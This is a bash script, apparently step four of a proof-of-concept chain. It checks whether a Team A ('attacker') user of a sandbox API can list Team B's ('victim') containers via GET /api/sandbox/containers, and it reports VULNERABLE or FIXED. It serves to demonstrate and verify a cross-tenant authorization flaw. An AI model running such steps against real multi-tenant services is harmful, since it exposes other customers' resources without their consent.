#!/usr/bin/env bash
# 04 — Attacker lists containers. THIS IS THE FIRST PROOF.
# Vulnerable: the victim's container appears in the attacker's list.
# Fixed:      the victim's container is absent.
set -euo pipefail
# shellcheck source=_lib.sh
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/_lib.sh"

banner "04  Attacker lists containers (cross-tenant leak?)"
require_state attacker.json
require_state victim-container-name

victim_container="$(cat "${STATE_DIR}/victim-container-name")"

body="$(api attacker GET /api/sandbox/containers)"
print_http
echo "${body}" | jq .
echo "${body}" > "${STATE_DIR}/attacker-containers.json"

http="$(last_http)"
if [[ "${http}" != "200" ]]; then
  verdict INCONCLUSIVE "attacker list failed with HTTP ${http} (expected 200)"
  exit 1
fi

found="$(echo "${body}" | jq -r --arg n "${victim_container}" '
  (.containers // []) | map(select(.name == $n)) | length
')"

echo
echo "  looking for victim container: ${victim_container}"
echo "  matches in attacker list:     ${found}"

if [[ "${found}" != "0" ]]; then
  verdict VULNERABLE "GET /api/sandbox/containers returned Team B container ${victim_container} to a Team A user"
  echo
  echo "Next: ./05-attacker-list-exposed-ports.sh"
  exit 0
fi

verdict FIXED "attacker list did not include victim container ${victim_container}"
echo
echo "If the rest of the chain is also fixed, later steps should 404."
echo "You can still run them to confirm:"
echo "  ./05-attacker-list-exposed-ports.sh"
